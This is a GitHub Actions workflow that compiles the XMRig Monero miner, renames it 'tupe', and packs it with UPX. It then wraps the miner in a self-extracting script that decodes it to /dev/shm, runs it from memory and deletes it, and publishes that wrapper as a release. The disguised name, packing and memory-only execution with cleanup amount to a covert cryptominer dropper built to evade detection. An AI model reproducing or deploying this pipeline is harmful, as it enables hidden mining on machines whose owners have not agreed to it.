name: Build & Package tupe (Memory-Only)

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build XMRig in Alpine container
        run: |
          docker buildx build \
            --load \
            --tag xmrig-musl:latest \
            --file Dockerfile.musl \
            --target builder \
            --build-arg BUILD_TYPE=release \
            .

      - name: Extract binary from container
        run: |
          docker create --name xmrig-extractor xmrig-musl:latest
          docker cp xmrig-extractor:/xmrig/build/xmrig ./tupe
          docker rm xmrig-extractor
          chmod +x tupe

      - name: Verify binary
        run: |
          file tupe
          ls -lh tupe

      - name: Install UPX
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq upx-ucl

      - name: Compress with UPX
        run: |
          upx -9 ./tupe
          ls -lh tupe

      - name: Create memory-only launcher script
        run: |
          # Create wrapper script header
          cat > tupe_run.sh << 'HEADER'
          #!/bin/sh
          # Memory-only execution wrapper
          # Extracted binary runs in /dev/shm (tmpfs)

          HEADER_SIZE=HEADER_PLACEHOLDER

          cleanup() {
            rm -f /dev/shm/tupe 2>/dev/null
          }
          trap cleanup EXIT

          # Extract to tmpfs (memory), execute, then cleanup
          tail -c $HEADER_SIZE "$0" | head -c -1 | base64 -d | gunzip > /dev/shm/tupe
          chmod 700 /dev/shm/tupe
          /dev/shm/tupe "$@"
          exit $?
          HEADER

          # Get script header size
          HEADER_LINE_COUNT=$(grep -n "HEADER_PLACEHOLDER" tupe_run.sh | cut -d: -f1)
          SCRIPT_HEADER=$(head -n $HEADER_LINE_COUNT tupe_run.sh)
          echo "$SCRIPT_HEADER" > tupe_run.sh

          # Count remaining lines (script body only, before payload)
          SCRIPT_LINES_BEFORE_PAYLOAD=$(wc -l < tupe_run.sh)

          # Create payload (base64 of gzip compressed binary)
          gzip -9 -c tupe | base64 -w0 > tupe_payload.b64

          # Append payload
          cat tupe_payload.b64 >> tupe_run.sh

          # Replace placeholder with actual header size offset
          # Calculate: file size - payload size = header size
          TOTAL_SIZE=$(wc -c < tupe_run.sh)
          PAYLOAD_SIZE=$(wc -c < tupe_payload.b64)
          HEADER_BYTE_SIZE=$((TOTAL_SIZE - PAYLOAD_SIZE))
          sed -i "s/HEADER_PLACEHOLDER/$HEADER_BYTE_SIZE/" tupe_run.sh

          chmod +x tupe_run.sh
          rm -f tupe_payload.b64

          echo "=== Final sizes ==="
          ls -lh tupe tupe_run.sh
          echo ""
          echo "tupe_run.sh is self-contained with UPX-compressed binary embedded"

      - name: Test execution in Docker
        run: |
          docker run --rm -v $PWD:/app alpine:3.19 sh -c '
            apk add --no-cache bash coreutils >/dev/null 2>&1
            cd /app
            chmod +x tupe_run.sh tupe
            echo "=== Testing tupe (UPX) ==="
            timeout 5 ./tupe --version 2>&1 | head -3 || echo "(no --version)"
            echo ""
            echo "=== Testing tupe_run.sh (memory-only) ==="
            timeout 5 ./tupe_run.sh --version 2>&1 | head -3 || echo "(failed)"
          '

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: tupe-memory-runner
          path: |
            tupe_run.sh
            tupe
          retention-days: 30

      - name: Upload release
        if: startsWith(github.ref, 'refs/tags/v') || github.event_name == 'release'
        uses: softprops/action-gh-release@v1
        with:
          files: tupe_run.sh
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}